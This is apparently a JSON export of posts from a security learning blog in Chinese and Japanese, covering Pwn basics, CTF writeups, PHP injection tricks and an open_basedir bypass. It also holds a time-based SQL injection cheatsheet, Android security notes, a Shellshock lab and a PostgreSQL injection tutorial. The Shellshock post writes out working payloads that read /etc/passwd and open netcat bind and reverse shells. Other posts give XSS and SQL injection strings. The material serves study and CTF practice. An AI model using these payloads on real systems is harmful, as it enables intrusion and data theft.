地址是0x1000的倍数，这个单位被称为”页” 进程启动时，ELF加载确保这样的内存布局 使用mmap()进行确保，并且通过sbrk()来做自动补齐 进程启动后，进程自身也可以使用mmap()来进行追加确保 补足 这里是虚拟内存，与物理内存存在差异 物理内存和虚拟内存都与内核相关联，这是一种被称为MMU(Memory Management Unit)的机制 用户程序只能看到虚拟内存，并不需要考虑物理内存 NX、ASLR、PIE 这个例子有0x0804XXXX和0xfXXXXXXX两种类型的起始地址，前者在堆之外每次启动不会变化，后者每次启动都会发生改变，这被称为ASLR(Address space layout randomization，地址空间配置随机加载)。 对前者也进行随机化的技术叫做PIE(position-independent executable, 地址无关可执行文件). 这个例子中stack，mapped之类的很多地方都是rwx，也就是说，可以在这些内存区域进行读取，写入和执行。 但是，这样的话安全性较差，因此NX(DEP)会使得text区域没有执行权限 RELRO 使用外部库(共享对象，*.so)时，他们会映射到地址空间的各个位置。 如果每次都计算这些库提供的函数地址，这不太方便，计算一次后保存到一个映射表会很方便后续使用。 这个表被称为GOT(Global Offset Table，全剧映射表)，它存在于地址固定的区域。 GOT实际上就在这里，但如果它是可写的，某些情况下如果它被重写，这个表也就变得不值得信任了。 因此，我们会使用一种叫做RELRO(Full-RELRO)的技术，在启动时计算所有外部库的所有函数地址，写入GOT中，然后使GOT只读。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记1:基本环境及概念","slug":"Pwn学习笔记1-基本环境及概念","date":"2019-02-21T04:36:20.000Z","updated":"2019-02-21T05:03:12.488Z","comments":true,"path":"2019/02/21/Pwn学习笔记1-基本环境及概念/","link":"","permalink":"https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E5%8F%8A%E6%A6%82%E5%BF%B5/","excerpt":"","text":"0x01 工具 IDA Pro Linux x86 and x64 推荐Debian系列（Ubuntu,Debian,Kali,…） qemu gdb 自定义.gdbinit gdb-peda gdb script gdb -q -x cmd ./binary gdb-server C Python Perl Bash功能 /dev/tcp/&lt;IPADDR&gt;/&lt;PORT&gt; Binutils , Elfutils objdump,readelf,eu-readelf… nasm/ndisasm/radare2 netcat(nc) socat socat TCP-LISTEN:4444,reuseaddr,fork exec:./binary&amp; strace/ltrace strace –fiv ./binary checksec.sh checksec.sh --file ./binary rp++ rp-lin-x86 --file=binary --unique --rop=5 0x02 pwn问题类型 本地权限提升 remote shell 夺取 0x03 pwn问题的攻略方法基本战略： binary各项设定检查 checksec(NX,ASLR,RELRO,PIE) 分析binary，找到漏洞点 向漏洞点发送测试数据 控制binary运行流程 例如控制EIP getshell 打开shell的各种方法： 运行shellcode Exec-shell Exec-shell + back connect system(&quot;/bin/sh&quot;) や execve(&quot;/bin/sh&quot;,0,0) open(&quot;flag&quot;) -&gt; read() -&gt; write() 某些情况下不能直接获取shell，但能读取flag","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Postbook Writeup(Hacker101 CTF)","slug":"Postbook-Writeup-Hacker101-CTF","date":"2019-02-15T07:38:52.000Z","updated":"2019-02-15T07:40:30.908Z","comments":true,"path":"2019/02/15/Postbook-Writeup-Hacker101-CTF/","link":"","permalink":"https://darkwing.moe/2019/02/15/Postbook-Writeup-Hacker101-CTF/","excerpt":"","text":"flag1随意注册账号后登录，发现已经存在的文章，两篇文章id分别为1和3，手动修改查看2即可获取： flag2弱口令 user:password 登录成功后获得： flag3对文章id进行遍历，发现一个较大的id存在内容： flag4编辑文章，修改id为空： flag5删除文章使用加密id，使用前面获取的user账号获取属于user用户的文章id，之后登录自己注册的账号进行越权删除： flag6 对Cookie值进行查询发现只是数字id的md5，将其修改为1的md5后访问： flag7创建文章时修改userid为其他用户id，越权创建，获得flag：","categories":[{"name":"Hacker101 CTF","slug":"Hacker101-CTF","permalink":"https://darkwing.moe/categories/Hacker101-CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"$_SERVER['SCRIPT_NAME']変数のインシェクション","slug":"$_SERVER['SCRIPT_NAME']変数のインシェクション","date":"2019-02-13T05:50:45.000Z","updated":"2019-02-13T05:53:28.177Z","comments":true,"path":"2019/02/13/$_SERVER['SCRIPT_NAME']変数のインシェクション/","link":"","permalink":"https://darkwing.moe/2019/02/13/$_SERVER['SCRIPT_NAME']%E5%A4%89%E6%95%B0%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B7%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3/","excerpt":"","text":"0x00 概要$_SERVER[‘SCRIPT_NAME’]はPHP用の１つ組み込み変数です。ここでは、使用時には、一般的にフィルタリングされません。 fuzzの後、この変数の取得は実際に問題がある、予期しないデータが導入されます。 一部のWebサーバーでは、この変数を直接使用すると、SQLインジェクションまたはxssの脆弱性が発生する可能性があります。 0x01 テストApache/2.4.23に $_SERVER[&#39;SCRIPT_NAME&#39;]変数があります。 私のローカルテスト環境は、Apache/2.4.23（Win32）OpenSSL/1.0.2j PHP/5.5.38 MySQL/5.5.53です。 現在Apache/2.4.23でのみ成功しています。 $_SERVER[&#39;SCRIPT_NAME&#39;]変数の公式ドキュメントは次のとおりです: img 簡単に言えば、この変数は、Webサービスのルートディレクトリから現在のファイルへのパスを返します。Webルートディレクトリが/var/www/htmlで、現在のファイルパスが/var/www/html/t/index.phpであると仮定すると、index.phpで取得された$_SERVER[&#39;SCRIPT_NAME&#39;]は/t/index.php。 上記は正常なプロセスです。 しかし、PHPにはパラメータを渡る方法が2種類があります。 1つは、index.php?id =1のような、キーと値のペアの伝統的な形式です。 もう一つのルートで、パラメータを渡すことです：/index.php/xx/b/c。$_SERVER[&#39;SCRIPT_NAME&#39;]変数は、ルートでパラメータを渡すことにさらに有害です。 ルートでパラメータを渡すのURLでは、URLの最後に /*を追加することができます。つまり、ファイル名の後にスペース + /*を追加して、ファイル名を破棄して、ファイル名の後にデータを取得できます。 img img テストでは、&#39;（一重引用符）&quot;（二重引用符）、;（セミコロン）&lt;&gt;（角カッコ）()（カッコ）などのペイロードで一般的に使用される記号はフィルタリングされません。 一般的なCMSでは、一般にGET、POST、COOKIEの3つの変数のみがフィルタリングされます.GPCのグローバルエスケープが有効になっていても、$_SERVER変数はエスケープされません。 特別な注意が必要なのは、ペイロードに?（疑問符）は表示されません、疑問符が切り捨てられ、ファイル名の後にデータを取得できなくなります。 0x02 使用方法私はかつてこのCMSに遭遇し、$_SERVER[&#39;SCRIPT_NAME&#39;]をページに直接書きました。 このようにして、反射的なxss攻撃を実行できます。 さらに、CMSはヘッダを保護せずにphpファイルとして直接ページをキャッシュします。 言い換えれば、私たちが書くPHP文もキャッシュファイルにキャッシュされます。 WebShellを直接生成します。 コード監査中に$_SERVER[&#39;SCRIPT_NAME&#39;]変数を追跡して、変数の値がデータベースに渡されるか、ページに直接渡されるかどうかを調べることができます。 0x03 ケーススタディ - XSSindex.phpコードは次のとおりです: ` exp: http://localhost/index.php/&lt;img src=x onerror=alert(1)&gt; /\\* img 0x04 ケーススタディ - SQLインジェクションindex.phpコードは次のとおりです: 123456789101112131415&lt;?phperror_reporting(0);$db&#x3D;&quot;xx&quot;;$dbuser&#x3D;&quot;xxxxx&quot;;$dbpwd&#x3D;&quot;xxxx&quot;;$host&#x3D;&quot;localhost&quot;;$mysql&#x3D;mysqli_connect($host,$dbuser,$dbpwd,$db) or die(&quot;connect failed&quot;);$sql&#x3D;&quot;select password from user where username&#x3D;&#39;&quot;.$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#39;&quot;;$result&#x3D;mysqli_query($mysql,$sql) or print_r(mysqli_error($mysql));$result_array&#x3D;mysqli_fetch_all($result);echo &quot;Your password is:&quot;.$result_array[0][0]; exp: 1http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))||&#39; &#x2F;* img","categories":[{"name":"梧桐百科","slug":"梧桐百科","permalink":"https://darkwing.moe/categories/%E6%A2%A7%E6%A1%90%E7%99%BE%E7%A7%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://darkwing.moe/tags/PHP/"}]},{"title":"glob://を使用して、open_basedirをバイパスする","slug":"glob-を使用して、open-basedirをバイパスする","date":"2019-02-11T05:34:15.000Z","updated":"2019-02-11T05:35:36.777Z","comments":true,"path":"2019/02/11/glob-を使用して、open-basedirをバイパスする/","link":"","permalink":"https://darkwing.moe/2019/02/11/glob-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6%E3%80%81open-basedir%E3%82%92%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E3%81%99%E3%82%8B/","excerpt":"","text":"0x00 open_basedir open_basedirは、指定されたディレクトリへのユーザアクセスを制限します。 つまり、ユーザーはサーバー上の指定されたディレクトリ以外のファイルにアクセスできません。 クロスサイトを防ぐためによく使用されます。 open_basedir=/home/wwwroot/home/web1/:/tmp/とすると、web1経由でサーバにアクセスするユーザは、サーバ上で/home/wwwroot/home/web1/および/tmp/以外のファイルを取得することはできません。もちろん、物事は絶対的なものではありません。 open_basedirの設定は、systemなどのコマンド実行関数では無効です。 一般に、コマンド実行を引き起こしやすいsystemやその他の関数は、disable_functionに置かれます。 したがって、通常の状況下では、open_basedir の設定はクロスサイトでは依然として非常に役に立ちます。 しかし、ハッカーの精神は何ですか？ ハッカーの精神は、不可能なものすべてに挑戦することです。 一連のコマンド実行機能が無効になっていても、open_basedirが設定されていても、スマートハッカーは目に見えない攻撃ポイントを使用して攻撃を実行します。open_basedirをバイパスするの最も一般的な使い方はsymlink()関数を使うことです。 具体的な使用については、私が知っている以上phith0nのブログでは言ったことが参照できます: https://www.leavesongs.com/bypass-open-basedir-readfile.html このため、disable_functionにsymlink()を追加する必要があります。 これは刑務所を構成し、Webshellを取得したハッカーは、制限されたフォルダに閉じ込められます。 0x01 glob://疑似プロトコル glob://疑似プロトコルの公式文書は以下の通りです: glob://によって、私たちのフィルタ基準を満たしのディレクトリを得ることができます。 問題はここで、glob://を使用してディレクトリをフィルタリングすることは、open_basedirによって制限されていません。glob://マッチングによって、open_basedirをバイパスする,指定されたディレクトリ以外のディレクトリにアクセスできます。 実際、PHPのglob()も同様の問題を抱えていました。 しかし、すぐに修正されました。 しかし、glob://の問題は今日まで続く。 0x02 コード例 私はここでドッカーを使用しています、環境は:nginx / 1.12.2 + PHP 7.1.7（cli）。 バイパス効果をよりよく知るために、disable_functionからscandir()を取り出しました。 次にコードを書く： 1&#x2F;&#x2F;index.php error_reporting(E_ALL); ini_set(&#39;open_basedir&#39;, &#39;&#x2F;home&#x2F;wwwroot&#x2F;default&#x2F;&#39;); eval($_GET[&#39;a&#39;]); glob://を使わずにディレクトリを列挙しようとします。 img open_basedirで許可されている範囲内のディレクトリを自由にリストすることは自明です。 ただし、指定されたファイルの範囲を超えた場合、open_basedir restriction in effecの警告を取得する、ディレクトリの列挙は実装できません。 次に、glob://疑似プロトコルを使用してその効果を確認します。 ご覧のとおり、glob://疑似プロトコルを使用した後で、/home/ディレクトリ下のサブディレクトリを取得できました。","categories":[{"name":"梧桐百科","slug":"梧桐百科","permalink":"https://darkwing.moe/categories/%E6%A2%A7%E6%A1%90%E7%99%BE%E7%A7%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://darkwing.moe/tags/PHP/"}]},{"title":"CTF問題を例として,parse_url関数をバイパスすることを学ぶ","slug":"CTF問題を例として-parse-url関数をバイパスすることを学ぶ","date":"2019-02-02T05:31:49.000Z","updated":"2019-02-02T05:32:53.160Z","comments":true,"path":"2019/02/02/CTF問題を例として-parse-url関数をバイパスすることを学ぶ/","link":"","permalink":"https://darkwing.moe/2019/02/02/CTF%E5%95%8F%E9%A1%8C%E3%82%92%E4%BE%8B%E3%81%A8%E3%81%97%E3%81%A6-parse-url%E9%96%A2%E6%95%B0%E3%82%92%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E5%AD%A6%E3%81%B6/","excerpt":"","text":"問題 運用保守担当者の間違いのため、イントラネット認証ページは外部ネットワークに展開されましたが、幸いにも、開発者はドメイン名の検証が行われました。 Writeup ソースコードを表示し、次のコードを見つけます: 123456789101112ini_set(&quot;display_errors&quot;,0); $uri &#x3D; $_SERVER[&#39;REQUEST_URI&#39;];if(stripos($uri,&quot;.&quot;))&#123; die(&quot;Unkonw URI.&quot;); &#125; if(!parse_url($uri,PHP_URL_HOST))&#123; $uri &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].$_SERVER[&#39;REQUEST_URI&#39;]; &#125; $host &#x3D; parse_url($uri,PHP_URL_HOST);if($host &#x3D;&#x3D;&#x3D; &quot;c7f.zhuque.com&quot;)&#123; setcookie(&quot;AuthFlag&quot;,&quot;flag&#123;*******&quot;); &#125; 明らかに、parse_url関数をバイパスすることを検査です. しかし、最初にドットのマッチングが増え、バイパスすることができます。 ペイロードを使用する：.@c7f.zhuque.com/..// 以上です。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://darkwing.moe/tags/PHP/"},{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"高負荷のSQL文を使用したTime-based SQLインシェクション","slug":"高負荷のSQL文を使用したTime-based-SQLインシェクション","date":"2019-02-01T01:59:06.000Z","updated":"2019-02-01T02:01:14.248Z","comments":true,"path":"2019/02/01/高負荷のSQL文を使用したTime-based-SQLインシェクション/","link":"","permalink":"https://darkwing.moe/2019/02/01/%E9%AB%98%E8%B2%A0%E8%8D%B7%E3%81%AESQL%E6%96%87%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9FTime-based-SQL%E3%82%A4%E3%83%B3%E3%82%B7%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3/","excerpt":"","text":"0x00 概要 sleep、benchmark関数を使用できない場合,より多くの計算量を伴うクエリは,データベースのクエリ時間を長くし、遅延注入の効果を達成する。たとえば、mssqlはこのようなものを使うことができます： 1AND 2333&#x3D;(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) 0x01 なぜ高負荷のSQL文を必要としますか？ 時間遅延を引き起こすいくつかの関数が注入で使用できない場合、たとえば、次の関数がフィルタリングされます： sleep benchmark Get_lock おそらくもっと データベースのクエリ時間を可能な限り長くするために、遅延注入のために重いクエリを使用することができます。たとえば、information_schemaの2つの大きなテーブルにデカルト積とその他のステートメントを実行させます。注意：benchmarkを使用した注入は、基本的には重いクエリの範囲内ですが、ここでは説明しません。 0x02 cheatsheet PostgreSQL AND 2333=(SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000000)) MSSQL AND 2333=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) Oracle AND 2333=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) IBM DB2 AND 2333=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) SQLite AND 23333=LIKE(‘ABCDEFG’,UPPER(HEX(RANDOMBLOB(100000000/2)))) Mysql AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C); より多くのpayload： https://github.com/sqlmapproject/sqlmap/blob/HEAD/xml/payloads/time_blind.xml 0x03 参照 https://www.anquanke.com/post/id/104319 （中国語、その後日本語に翻訳する）","categories":[{"name":"梧桐百科","slug":"梧桐百科","permalink":"https://darkwing.moe/categories/%E6%A2%A7%E6%A1%90%E7%99%BE%E7%A7%91/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://darkwing.moe/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Android恶意代码分析与渗透测试","slug":"Android恶意代码分析与渗透测试","date":"2019-01-31T04:58:41.000Z","updated":"2019-01-31T05:03:07.051Z","comments":true,"path":"2019/01/31/Android恶意代码分析与渗透测试/","link":"","permalink":"https://darkwing.moe/2019/01/31/Android%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"1. Android的基本概念1.1 Android的架构 Linux内核 库 Android运行时 应用程序与框架 设备文件目录结构 1.2 Android重要组件 Activity Service Content Provider 1.3 Android应用程序的基本结构 Androidmanifest.xml classes.dex 2.Android应用程序诊断环境2.1 构建Android环境 Android SDK ADK Android Studio 测试机或虚拟机 2.2 构建数据包分析及检测环境 路由器 Cain&amp;Able Wireshark / Tshark tcpdump 2.3 切换设备平台 Rooting Tegrak内核 CF-Auto-Root 2.4 Android诊断工具介绍 ADB adb pull / push logcat pm(package manager) Busybox 2.5 使用编辑器分析文件格式 010Editor dex模板 3. Android APP分析方法3.1 通过反编译进行静态分析 dex2jar jd-gui AstroGrep jad 3.2 通过动态调试进行分析 apktool smali signapk 3.3 通过代码修补绕过apk文件 strings.xml 3.4 使用AndroGuard进行分析 Androapkinfo Androxml Androluze Androdd Androdiff / Androsim 3.5 使用DroidBox进行自动分析3.6 使用Sublim插件进行分析 AndroGuard 3.7 使用APKInspector进行分析3.8 使用dexplorer和dexdump进行分析3.9 使用Santoku分析移动APP4.恶意代码分析4.1 使用在线分析服务 Anubis VirusTotal VirusTotal APP andrototal apkscan app Dexter APK Analyzer4.2 手动分析恶意代码APP4.3 用户应对恶意代码威胁的方法 5.Android移动服务诊断5.1 构建虚拟漏洞诊断测试环境 AndroidLab 5.2 OWASP TOP 10 移动安全威胁5.3 保存不安全的数据 /mnt/sdcard /data/data/package_name 应对方案： Private 5.4 易受攻击的服务器端控制5.5 使用易受攻击的密码5.6 传输层保护不足（非加密通信） AppUse 5.7 源代码信息泄露 Proguard Dexguard AndroidEnv 5.8 泄露重要信息 泄露内存中的重要信息 5.9 泄露日志信息 LogCat 5.10 Web服务漏洞项目诊断5.11 App应对方案： 加密源代码 Proguard6. 使用Android诊断工具6.1 PacketShark： 网络数据包截获工具6.2 Drozer： 移动诊断框架6.3 ASEF： 移动设备漏洞工具6.4 DroidSheep： Web会话截取工具6.5 dSploit： 网络诊断工具","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://darkwing.moe/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://darkwing.moe/tags/Android/"},{"name":"移动安全","slug":"移动安全","permalink":"https://darkwing.moe/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}]},{"title":"Android安全攻防实战","slug":"Android安全攻防实战","date":"2019-01-31T04:28:23.000Z","updated":"2019-01-31T04:31:41.923Z","comments":true,"path":"2019/01/31/Android安全攻防实战/","link":"","permalink":"https://darkwing.moe/2019/01/31/Android%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/","excerpt":"","text":"1. Android开发工具配置环境，开发工具，测试机或者虚拟机，adb 2. 实践app安全2.2 检查app的证书和签名解压apk文件 12345678输出证书内容keytool -printcert -file META-INF&#x2F;CERT.RSA查看签名文件内容cat META-INF&#x2F;CERT.SF查看证书openssl pkcs7 -inform DER -in META-INF&#x2F;CERT.RSA -noout -print_certs -text 2.3 对Android app签名12345生成keystorekeytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore对APK重新签名jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore demo.keystore -signedjar demo_signed.apk 2.4 验证app的签名12验证APK签名jarsigner -verify -verbose demo_signed.apk Androidmanifest.xml文件 adb与Activity交互（也可使用drozer） adb pull和push，文件管理 3. Android安全评估工具集成环境：Santoku（基于Ubuntu，集成部分移动安全工具） drozer 123456789101112启动drozer agentadb forward tcp:31415 tcp:31415drozer console connectrun app.package.listrun app.package.list -f app名run app.package.info -a 包名run app.activity.info -a 包名run app.provider.info -a 包名run app.service.info -a 包名run app.broadcast.info -a 包名run app.package.attacksurface 包名run app.activity.start --action *** --category *** --component *** 编写drozer模块 4. 利用app中的漏洞 logcat 网络流量：tcpdump 使用drozer攻击导出的组件 对app做中间人攻击（Burpsuite或其他MITM工具 5.保护app 组件，不必要导出 定制权限 content provider路径 防御sql注入 验证app的签名（防篡改） 反逆向工程（检测安装程序，模拟器，调试标志位） Proguard删除日志和/或进行混淆 DexGuard进行高级混淆 6.逆向app12345678910111213141516171819202122232425java To dexjavac -source 1.6 -target 1.6 Example.java#dx路径：D:\\AndroidSDK\\build-tools\\22.0.1\\lib\\dx.jardx --dex --output&#x3D;Example.dex Example.classdex文件格式dex文件解析：#dexdump路径：D:\\AndroidSDK\\build-tools\\22.0.1\\dexdumpdexdump Example.dexdx --dex --verbose-dump --dump-to&#x3D;outfile.txt Example.classdex To smalibaksmali.jar Example.dex -o outsmali To dexsmali.jar out -o out.dexdex2javadex2jar Example.dexjd-guiNDK so库objdump -D ×××.sogdbserver+gdb 7.网络安全 验证SSL自签名证书（注意不要使用网络上的错误代码） 使用onionkit库中的StrongTrustmanager SSL pinning–限定受信SSL的范围 8.原生代码中漏洞的利用和分析 溢出及root漏洞，略 自动fuzzing测试Android原生代码： Radamsafuzzer busybox 9.加密与在开发时使用设备管理策略 使用加密库 生成对称加密密钥 保护SharedPreferences数据 基于口令的加密 用SQLCipher加密数据库 Android Keystore provicer 在开发时使用设备管理策略","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://darkwing.moe/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://darkwing.moe/tags/Android/"},{"name":"移动安全","slug":"移动安全","permalink":"https://darkwing.moe/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-01-31T03:00:00.000Z","updated":"2019-01-31T03:04:41.164Z","comments":true,"path":"2019/01/31/hello-world/","link":"","permalink":"https://darkwing.moe/2019/01/31/hello-world/","excerpt":"","text":"新域名，之后在这边更新吧 Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"CVE-2014-6271/Shellshock","slug":"CVE-2014-6271-Shellshock","date":"2015-09-13T02:12:02.000Z","updated":"2019-09-24T02:13:16.281Z","comments":true,"path":"2015/09/13/CVE-2014-6271-Shellshock/","link":"","permalink":"https://darkwing.moe/2015/09/13/CVE-2014-6271-Shellshock/","excerpt":"","text":"简介主要介绍了CVE-2014-6271漏洞的利用。这个漏洞影响Bourne Again Shell “Bash”。Bash通常无法通过web应用程序访问，但可以通过公共网关接口（Common Gateway Interface “CGI”）间接接触。 指纹识别通过代理（Burp Suite 或者 OWASP Zap）访问web应用程序，我们可以发现当页面被加载时访问了多个URL： 要利用“Shellshock”，我们需要找到一种方式来和Bash进行“交谈”。这意味着找到一个CGI来使用Bash。CGI通常使用Python或者Perl，但在老旧的服务器上用Shell或者C写的CGI也很常见。 CGI如何工作当你调用一个CGI，web服务器（这里是Apache）将开始一个新的进程并运行CGI。这里它会启动一个Bash进程并且运行CGI脚本。Apache需要向CGI脚本传递信息。它使用环境变量来做到这些。环境变量在CGI脚本中是有效使用的。它允许Apache很容易的向CGI传递每一个头信息（或者其他信息）。如果你的HTTP请求头中有一个名叫Blah的头，那么在CGI脚本中你将有一个名为HTTP_BLAH的环境变量。 漏洞在这里，我们主要关注Bash相关漏洞的第一个版本，但还有很多：CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187…问题的根源在于Bash可以声明环境变量是一个内部函数。该漏洞的第一个版本与与函数声明导致任意命令执行有关。首先，我们需要声明环境变量是一个函数，通过使用()。然后，我们将添加一个空的函数体。最后，我们可以在函数声明后添加我们想要运行的命令。更多的细节可以在这份邮件中找到（ following email on oss-sec）。如果你还记得我们之前所说的，Apache使用环境变量将头信息传递给CGI。因为它是基于CGI的Bash，我们可以声明一个空函数，然后在声明之后添加任意命令。 利用该漏洞可以通过代理的repeater模块或者netcat进行利用。有很多攻击在载荷可用，这取决于你想要达到什么效果。你可以使用下面的载荷来读取任意文件： 1$ echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc vulnerable 80 这个有效载荷将读取文件 /etc/passwd 并将内容显示在响应中。你需要查看HTTP响应头来查看文件内容。 绑定Shell如果你想运行命令，最简单的方法是绑定一个Shell。你可以使用netcat（或者nc）监听一个端口并且重定向输入输出到 /bin/sh 。 1$ echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc vulnerable 80 在这里。已经给出了netcat/nc的路径。在真实系统中，你将不得不暴力枚举路径，甚至它有可能根本没安装。如果连接生效，CGI将等待你进行连接。然后，你可以连接到绑定端口： 123$ nc vulnerable 9999iduid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab) 绑定Shell有着很大的限制：在你和受害者之间可能有防火墙，这将导致端口只是绑定，但你无法连接。为了绕过这一点，我们需要让服务器主动连接我们。 反弹Shell我们希望服务器连接到我们，。要做到这种效果，我们需要首先在本地监听一个端口。我们需要使用一个服务器可以访问的端口，最常见的是21（FTP）、53（DNS）、123（NTP）、80（HTTP）和443（HTTPS），这些端口是服务器用来保持系统更新和进行每天的工作的端口。我们将绑定443端口（你需要root用户或者sudo权限），使用下面的命令： 1# nc -l -p 443 现在，我们只需要调整攻击载荷，以使得服务器连接回我们的443端口： 1echo \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc vulnerable 80 然后返回到最初的netcat，我们可以在本地输入命令，它们将在服务器系统上运行： 123# nc -l -p 443iduid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab) 总结这个练习将教你如何手动检测和利用Shellshock获得命令的执行。这种安全漏洞是非常有趣的，往往可以在很长一段时间内不被发现，因为它位于内部的组件之间的相互作用。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"From SQL Injection to Shell: PostgreSQL edition","slug":"From-SQL-Injection-to-Shell-PostgreSQL-edition","date":"2015-04-09T05:18:44.000Z","updated":"2019-09-19T05:21:12.442Z","comments":true,"path":"2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/","link":"","permalink":"https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/","excerpt":"","text":"SQL注入检测检测方法已经在“From SQL Injection to Shell”中详细描述过。唯一的区别是错误信息： 1Warning: pg_exec(): Query failed: ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat&#x3D;2&#39; ^ in &#x2F;var&#x2F;www&#x2F;classes&#x2F;picture.php on line 17 ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: SELECT * FROM pictures where cat&#x3D;2&#39; ^ SQL注入并不是一门精确的科学，很多东西都会影响到你的测试结果。如果你遇到这些，继续测试注入，尝试测试出后台代码来确认它是一个SQL注入。 为了找到SQL注入，你需要访问网站并且使用这些方法测试每一个页面的每一个参数。一旦你发现了SQL注入，你可以到下一节去学习如何利用它。 SQL注入利用现在我们在页面http://vulnerable/cat.php发现了一个SQL注入，为了更进一步，我们需要利用它来检索信息。为此，我们需要了解SQL中使用的 UNION 关键字。 在PostgreSQL中使用UNION进行SQL注入类似于MySQL，使用UNION利用SQL注入遵循下面的步骤： 找出列数用来执行UNION 找出哪些列被显示在页面上 从元表数据库中检索信息 从其他表或数据库中检索信息 为了执行SQL注入的请求，你需要找到所查询的第一部分返回的列数。你需要猜这个数，除非你有应用程序的源代码。 有两种方法得到这个信息： 使用 UNION SELECT 和增加列数； 使用 ORDER BY 语句。 如果你尝试 UNION 并且两个查询返回的列数是不同的，数据库将抛出一个错误： 1Warning: pg_exec(): Query failed: ERROR: each UNION query must have the same number of columns 可以使用这个属性来猜列数。例如，如果你可以注入以下语句： SELECT id,name,price FROM articles where id=1 ，你可以采用以下步骤： SELECT id,name,price FROM articles where id=1 UNION SELECT 1 